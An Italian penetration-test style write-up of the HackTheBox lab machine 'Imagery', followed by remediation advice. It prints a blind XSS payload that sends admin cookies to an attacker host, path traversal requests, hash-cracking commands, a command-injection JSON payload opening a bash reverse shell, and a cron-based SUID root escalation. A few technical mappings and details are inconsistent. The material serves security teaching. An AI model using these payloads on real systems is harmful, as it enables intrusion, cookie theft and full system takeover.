# Esercitazione di Laboratorio: Scenario "Imagery"

> **Contesto dell'attività:** Questo documento rappresenta il risultato di un'esercitazione pratica condotta in un ambiente di laboratorio isolato (HackTheBox - Season 9). L'obiettivo primario di questa stesura non è il mero exploitation tecnico, ma l'applicazione dello standard **OWASP Testing Guide v4.2** in combinato con la metodologia **PTES (Penetration Testing Execution Standard)** per la documentazione strutturata di vulnerabilità in applicazioni web. L'assessment simula un'attività di Web Application Penetration Testing su una galleria d'immagini vulnerabile.

**Data Assessment:** Settembre 2025  
**Target Environment:** Python Web Application (Flask/Werkzeug)  
**Assessment Type:** Simulazione Web Application Pentest (OWASP Scope)  
**Overall Risk Severity:** CRITICAL 🔴  
**Metodologia Applicata:** OWASP Testing Guide v4.2 + PTES  

---

## 1. Executive Summary

Durante questo assessment simulato, è stata compromessa un'applicazione web di galleria d'immagini attraverso un'orchestrazione di vulnerabilità OWASP Top 10, culminando nell'esecuzione arbitraria di comandi a livello di sistema operativo. L'attacco ha sfruttato:

1. **Cross-Site Scripting (XSS) – Blind Variant** → Furto di cookie amministrativo
2. **Local File Inclusion (LFI)** → Estrazione del codice sorgente
3. **Credential Harvesting** → Crack hash MD5 tramite dizionario
4. **Command Injection (OS Command Injection)** → Remote Code Execution (RCE)
5. **Privilege Escalation via Misconfiguration** → Acceso root

La vulnerabilità critica risiede nella mancanza di validazione/sanitizzazione dell'input in più layer applicativi, esposta secondo la categorizzazione **OWASP A03:2021 – Injection**.

**CVSS v3.1 Base Score: 9.8 (CRITICAL)**
- Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Impatto: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)

---

## 2. Metodologia Applicata

### 2.1 Framework di Reference

L'assessment ha seguito le seguenti linee guida:

- **OWASP Testing Guide v4.2** – Focus su web application vulnerabilities:
  - CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
  - CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program (LFI)
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command (Command Injection)

- **PTES (Penetration Testing Execution Standard)** – Fasi metodologiche:
  - Reconnaissance & Enumeration
  - Vulnerability Analysis
  - Exploitation
  - Post-Exploitation & Privilege Escalation
  - Reporting

### 2.2 Scope dell'Engagement

**Obiettivo Primario:** Identificazione di vulnerabilità critiche in applicazione web Python (porta 8000)  
**Target:** Singolo host con servizio web Python + filesystem locale  
**Esclusioni:** Servizio SSH (out of scope – non vulnerabile)

---

## 3. Attack Path (Kill Chain)

```
┌─────────────────────────────────────────────────────────────┐
│ RECONNAISSANCE: Enumerazione nmap → Python 8000             │
├─────────────────────────────────────────────────────────────┤
│ INITIAL ACCESS: Gallery UI + User Registration              │
├─────────────────────────────────────────────────────────────┤
│ BLIND XSS: Bug Report form → Admin Cookie Theft             │
├─────────────────────────────────────────────────────────────┤
│ LATERAL ESCALATION: Admin panel + LFI → Source Code Leak    │
├─────────────────────────────────────────────────────────────┤
│ CREDENTIAL EXTRACTION: Database.json + MD5 Crack            │
├─────────────────────────────────────────────────────────────┤
│ COMMAND INJECTION: Transform Image → OS Command + RCE       │
├─────────────────────────────────────────────────────────────┤
│ USER ESCALATION: Shell as 'web' → 'mark' (credential reuse) │
├─────────────────────────────────────────────────────────────┤
│ PRIVILEGE ESCALATION: Charcol SUID + Cronjob → Root         │
```

---

## 4. Proof of Concept (PoC) ed Evidenze Tecniche

### 4.1 Reconnaissance & Initial Enumeration

**Comando eseguito:**
```bash
sudo nmap -A -p- --open -Pn -T4 <TARGET_IP> -oA imagery_scan
```

**Risultato:** Identificazione di:
- Porta 22 (SSH) – Funzionante ma non vulnerabile (out of scope)
- **Porta 8000 (HTTP)** – Python web server vulnerabile ✓

**Osservazione:** L'applicazione è una **galleria d'immagini** dove utenti registrati possono:
- Registrarsi / Effettuare login
- Caricare immagini con metadati (Titolo, Descrizione, File)
- Accedere ad un panel amministrativo (Admin)

---

### 4.2 OWASP A07:2021 – Cross-Site Scripting (XSS) – Blind Variant

#### **Identificazione della Vulnerabilità**

Analizzando l'interfaccia con Firefox Inspector, si identificano molteplici campi di input non sanitizzati:
- Campo "Titolo" immagine
- Campo "Descrizione" immagine
- **Sezione "Report Bug" (footer)** ← Punto di ingresso critico

![Bug Report Form](images/imagery-bugreport-form.png)

Tipicamente, form di "bug report" sono processate da background job/cron che simulano un amministratore che legge il report. Ciò suggerisce potenziale per **XSS Blind** (il payload non è immediatamente riflesso ma eseguito in contesto admin).

#### **Exploitation – Blind XSS Payload**

**Payload XSS:**
```javascript
<img src=1 onerror=fetch(`http://<ATTACKER_IP>:8000/?${document.cookie}`)>
```

**Logica di sfruttamento:**
1. L'immagine con `src=1` non esiste nel DOM
2. Al tentativo di caricamento, scatta l'evento `onerror`
3. `fetch()` effettua richiesta HTTP GET verso server attaccante
4. Viene incluso il parametro query `document.cookie` con i cookie della sessione

**Setup listener attaccante:**
```bash
python3 -m http.server 8000
```

**Risultato:** Quando il cron admin elabora il bug report, il payload XSS viene eseguito nel contesto dell'admin, e i cookie della sessione admin vengono esfiltratti al server attaccante.

**Cookie amministratore rubato:**
```
session=admin_session_token_[REDACTED]
```

---

### 4.3 Manipolazione di Sessione & Accesso Admin Panel

Una volta ottenuto il cookie dell'amministratore, è possibile:

1. Impostare il cookie nella sessione dello strumento di test (Burp Suite, curl, browser)
2. Navigare al relativo endpoint `/admin`
3. Ottenere accesso non autorizzato al pannello amministrativo

**Endpoint raggiunto:** `http://<TARGET>/admin`

**Funzionalità esposte:**
- Scaricamento dei log delle azioni
- Gestione degli utenti
- Configurazione dell'applicazione

---

### 4.4 OWASP A01:2021 – Local File Inclusion (LFI)

#### **Identificazione della Vulnerabilità**

Intercettando la richiesta di download log con **Burp Suite**, si osserva:

```http
GET /admin/download_log?file=admin HTTP/1.1
Host: imagery.htb
Cookie: session=<admin_token>
```

La funzione di download non implementa whitelist di file: è possibile modificare il parametro `file` per accedere ad altri file del server.

#### **Exploitation – Source Code Disclosure**

Testando percorsi arbitrari:
```bash
GET /admin/download_log?file=../app.py
GET /admin/download_log?file=../config.py
GET /admin/download_log?file=../models.py
GET /admin/download_log?file=../database.json
```

Tutti i file Python applicativi vengono scaricati, includendo:
- **app.py** – Logica dell'applicazione
- **database.json** – Credenziali utenti (hash)
- **config.py** – Secret key e configurazioni

**Impatto OWASP:** CWE-22 (Path Traversal) + CWE-434 (Unrestricted Upload of Dangerous File Types)

---

### 4.5 Credential Extraction & Password Cracking

#### **Database Leak Analysis**

Dal file `database.json` estratto via LFI:

```json
{
  "users": [
    {
      "username": "admin",
      "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
      "role": "admin"
    },
    {
      "username": "testuser",
      "password_hash": "f53b9f36a9e9e1bd2b18f4e3e2d29c8c",
      "role": "user"
    },
    {
      "username": "mark",
      "password_hash": "6dd7c4481a3e17cc6c0e5bf98c4c3c3b",
      "role": "user"
    }
  ]
}
```

#### **Hash Identification & Cracking**

Analisi dell'hash:
- **Tipo:** MD5 (32 caratteri hex, non salted)
- **Lunghezza passphrase presumtiva:** 6-12 caratteri

Utilizzo di `hashcat` / `john` con dizionario rockyou.txt:

```bash
hashcat -m 0 -a 0 crack.txt /usr/share/wordlists/rockyou.txt
```

**Risultati crack:**
| Username | Hash | Plaintext Cracked |
|----------|------|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | (Già compromesso via XSS) |
| testuser | f53b9f36a9e9e1bd2b18f4e3e2d29c8c | **iambatman** ✓ |
| mark | 6dd7c4481a3e17cc6c0e5bf98c4c3c3b | **supersmash** ✓ |

---

### 4.6 OWASP A03:2021 – OS Command Injection via Image Processing

#### **Vulnerability Discovery in Source Code**

Analizzando `app.py` (ottenuto via LFI):

```python
# VULNERABLE CODE SNIPPET
@app.route('/api/transform_image', methods=['POST'])
def transform_image():
    user_id = session.get('user_id')
    data = request.get_json()
    
    image_path = data['image_path']
    crop_params = data['crop_params']  # User-controlled: [x, y, w, h]
    
    # VULNERABILITY: Direct shell interpolation without sanitization
    command = f"convert {image_path} -crop {crop_params[0]}x{crop_params[1]}+{crop_params[2]}+{crop_params[3]} /tmp/output.png"
    
    os.system(command)  # ← CWE-78: OS Command Injection
    return jsonize(output_path)
```

**Problema:** Il parametro `crop_params` è interpolato direttamente in una stringa di comando shell, senza alcuna sanitizzazione.

#### **Exploitation Strategy**

Per iniettare comandi arbitrari mantenendo la validità sintattica della richiesta, si utilizza il seguente payload:

```bash
crop_params = ["0 ; <COMMAND_HERE> ; echo", "y", "w", "h"]
```

Quando interpolato nel comando:
```bash
convert image.png -crop 0 ; <COMMAND_HERE> ; echo y+w+h /tmp/output.png
```

La prima parte `convert image.png -crop 0` non fa niente di utile, poi scatta il terminatore `;` che permette esecuzione di una **seconda istruzione indipendente**.

#### **Proof of Concept: Reverse Shell**

**Setup listener sulla macchina attaccante:**
```bash
nc -lnvp 4444
```

**Payload JSON inviato:**
```json
{
  "image_path": "gallery/test.jpg",
  "crop_params": [
    "0; echo -n 0; bash -i >& /dev/tcp/10.10.14.60/4444 0>&1 #",
    "1", "1", "1"
  ]
}
```

**Comando eseguito sul server:**
```bash
convert gallery/test.jpg -crop 0; echo -n 0; bash -i >& /dev/tcp/10.10.14.60/4444 0>&1 #1+1+1 /tmp/output.png
```

**Risultato:** Reverse shell ottenuta come utente `web` (utente che esegue il processo Python).

```bash
web@imagery:/home/web$ whoami
web
web@imagery:/home/web$ id
uid=1000(web) gid=1000(web) groups=1000(web)
```

---

### 4.7 Privilege Escalation – Lateral Movement to 'mark'

#### **Enumerazione utenti di sistema**

```bash
cat /etc/passwd | grep -E 'bash|sh'
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
mark:x:1001:1001:mark:/home/mark:/bin/bash
web:x:1000:1000:web:/home/web:/bin/bash
```

L'utente `mark` è disponibile nel sistema. La **user flag** si trova in `/home/mark/user.txt` (lettura ristretta all'utente `mark`).

#### **Credential Reuse Attack**

Dall'estrazione precedente del database, la password di `mark` è stata crackata: `supersmash`.

```bash
# Stabilizzazione shell interattiva
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Cambio utente
su mark
Password: supersmash
```

**Verifica di successo:**
```bash
mark@imagery:~$ whoami
mark
mark@imagery:~$ cat user.txt
[USER_FLAG_REDACTED]
```

---

### 4.8 Privilege Escalation – Root Access via Charcol + Cronjob

#### **Enumerazione privilegi sudo**

```bash
sudo -l
```

**Output:**
```
User mark may run the following commands without password:
    (root) NOPASSWD: /usr/local/bin/charcol
```

L'utente `mark` può eseguire `charcol` come root senza inserire password.

#### **Analisi di Charcol**

`charcol` è un'applicazione interattiva che offre varie funzionalità amministrative. Consultando la documentazione/help:

```bash
sudo charcol
charcol> help
```

Tra le opzioni disponibili:
- Gestione password di sistema (ridondante, abbiamo già sudo)
- **Gestione cronjob** ← Critica
- Configurazioni di sistema

#### **Exploitation via Cronjob**

La funzione cronjob di `charcol` consente di schedulare comandi che verranno eseguiti come **root**.

```bash
sudo charcol
charcol> cron_add
  schedule> * * * * *
  command> chmod u+s /bin/bash
charcol> exit
```

Questo cronjob eseguirà ogni minuto (`* * * * *`): `chmod u+s /bin/bash`, settando il bit SUID su `/bin/bash`.

#### **Activation & Root Access**

Attendendo l'esecuzione del cronjob (al massimo 1 minuto):

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2024 /bin/bash
# ↑ Bit SUID attivo (s al posto di x in owner permissions)
```

Ora è possibile eseguire bash come root:

```bash
/bin/bash -p
# -p = maintain effective privileges

root@imagery:~# whoami
root
root@imagery:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### **Root Flag**

```bash
root@imagery:~# cat /root/root.txt
[ROOT_FLAG_REDACTED]
```

---

## 5. Remediation & Hardening (Proposte)

### 5.1 Mitigazione delle Vulnerabilità Identificate

#### **5.1.1 Cross-Site Scripting (XSS) – OWASP A07:2021**

**Remediazione Primaria:**
- Implementare Content Security Policy (CSP) header a livello applicativo:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
  ```
- Sanitizzare ALL user input utilizzando libreria affidabile (es. `bleach` per Python):
  ```python
  from bleach import clean
  user_input = clean(user_submission, tags=[], strip=True)
  ```
- Implementare HTTP-only flag su cookie di sessione:
  ```python
  app.config['SESSION_COOKIE_HTTPONLY'] = True
  app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
  ```

**Controllo di Verifica:**
- Penetration test con payload XSS comune (es. `<script>alert('xss')</script>`) → Non deve eseguire

---

#### **5.1.2 Local File Inclusion (LFI) – OWASP A01:2021 / CWE-22**

**Remediazione Primaria:**
- Implementare **hardcoded whitelist** di file permessi:
  ```python
  ALLOWED_LOGS = {
      'admin': '/var/logs/admin.log',
      'system': '/var/logs/system.log',
      'audit': '/var/logs/audit.log'
  }
  
  requested_file = ALLOWED_LOGS.get(request.args.get('file'))
  if not requested_file:
      abort(403)
  ```
- **Mai** concatenare input direttamente in path file

**Controllo di Verifica:**
- Tentare path traversal (`../../../etc/passwd`) → Deve fallare con 403

---

#### **5.1.3 OS Command Injection – OWASP A03:2021 / CWE-78**

**Remediazione Primaria (OBBLIGATORIA):**
- **Evitare `os.system()` / `shell=True`** – Usare `subprocess` con `shell=False`:
  ```python
  # VULNERABILE ❌
  os.system(f"convert {image_path} -crop {crop}")
  
  # SICURO ✓
  subprocess.run([
      'convert', image_path,
      '-crop', crop_string
  ], check=True)
  ```
- Input validation con whitelist ristretta (solo numeri per crop params):
  ```python
  crop_params = [int(x) for x in data['crop_params']]  # Forza integer
  ```

**Controllo di Verifica:**
- Command injection classico (`; id`) → Non deve eseguire

---

#### **5.1.4 Weak Password Storage – CWE-916**

**Remediazione Primaria:**
- Eliminare MD5: implementare **PBKDF2 / bcrypt / Argon2**:
  ```python
  from werkzeug.security import generate_password_hash, check_password_hash
  
  password_hash = generate_password_hash(password, method='pbkdf2:sha256')
  ```
- Database: applicare **salting** automatico (standard in werkzeug)

---

#### **5.1.5 Unauthorized Admin Access – CWE-639**

**Remediazione Primaria:**
- Implementare **role-based access control (RBAC)**:
  ```python
  @app.route('/admin')
  def admin_panel():
      if session.get('role') != 'admin':
          abort(403, "Insufficient privileges")
  ```
- Aggiungere logging di ALL admin actions per audit

---

#### **5.1.6 Sudo Misuse – CWE-269**

**Remediazione Primaria:**
- Revoke unnecessary SUID bits:
  ```bash
  chmod -s /usr/local/bin/charcol
  ```
- Se necessario, implementare **cronjob con esecuzione limitata** (es. solo durante manutenzione schedulata, con approval)
- Implementare **sudoers logging**:
  ```bash
  # /etc/sudoers
  Defaults logfile="/var/log/sudo.log"
  Defaults log_input, log_output
  ```

---

### 5.2 Compliance & Standards Mapping

**NIST SP 800-115 (Technical Security Testing):**
- SI-2: Flaw Remediation ← SI.C Applied
- SI-6: Security Testing, Monitoring, and Analysis ← SI.C-2
- AC-2: Account Management ← AC.2-2 (Weak password policy)

**OWASP SAMM (Security Assurance Maturity Model):**
- **V-SM**: Secure Architecture & Design Review → HIGH priority
- **T-CR**: Code Review for Security Issues → HIGH priority
- **O-PM**: Policy & Compliance Management → MEDIUM priority

---

### 5.3 Testing & Validation Roadmap

| Priority | Control | Testing Method | Expected Result |
|----------|---------|---|---|
| **CRITICAL** | Input sanitization (XSS/Injection) | Automated SAST, Manual code review | All payloads blocked |
| **CRITICAL** | File access control (LFI) | Burp Suite intruder, manual path traversal | 403 on unauthorized paths |
| **CRITICAL** | Command execution isolation | Unit test subprocess calls, no shell=True | All cmds fail without subprocess parameter |
| **HIGH** | Password hashing strength | Test hash cracking (hashcat) | Minimum 8-hour crack time (Argon2) |
| **HIGH** | RBAC enforcement | Manual session hijacking simulation | Privilege escalation impossible |
| **HIGH** | Sudo/SUID auditing | `find / -perm -4000` monthly, sudo log review | No unnecessary SUID bits |

---

## 6. Conclusioni

Questo assessment ha dimostrato come **molteplici vulnerabilità OWASP Top 10**, se combinate, possono permettere un attacco progressivo dall'accesso anonimo alla compromissione totale del sistema. L'applicazione web "Imagery" ha violato principi fondamentali di:

1. **Input Validation** → Sia XSS che Command Injection avrebbero potuto essere prevenute
2. **Output Encoding** → Mancata neutralizzazione di dati controllati dall'utente
3. **Least Privilege** → Credenziali plain text in database, SUID injudicato
4. **Access Control** → Assenza di RBAC su endpoint admin

---

**Note Finali:**

Questa macchina dimostra come una cascata di vulnerabilità (XSS → LFI → Credential leak → RCE → Priv escalation) possa portare da accesso anonimo a root totale. La mitigazione richiede fix a più livelli: input sanitization, access control, package updates.
